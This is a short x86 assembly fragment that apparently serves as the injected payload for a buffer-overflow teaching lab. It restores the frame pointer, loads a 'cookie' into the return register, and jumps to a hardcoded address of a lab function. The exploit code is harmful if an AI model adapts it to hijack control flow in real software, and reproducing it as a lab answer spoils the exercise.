leal 0x18(%esp), %ebp	/* set the correct %ebp address */
movl $0x2eca4965, %eax  /* set return value as cookie */
pushl $0x08048d0e      	/* push the address of testn to the stack */
ret        	            /* go back to test */
